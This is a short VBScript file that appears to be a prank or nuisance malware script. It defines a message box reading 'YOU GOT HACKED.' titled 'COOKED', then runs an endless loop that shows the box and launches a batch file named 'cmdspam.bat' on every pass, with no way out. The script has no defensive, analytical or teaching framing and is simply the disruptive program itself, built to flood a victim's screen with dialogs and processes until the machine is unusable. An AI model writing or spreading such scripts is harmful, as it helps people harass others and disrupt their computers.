Function ShowWarning()
    MsgBox "YOU GOT HACKED.", vbOKOnly + vbInformation, "COOKED"
End Function
Set sh = CreateObject("WScript.Shell")

Do while True
    Call ShowWarning
    sh.Run "cmdspam.bat", 1, False
Loop
Set sh = Nothing
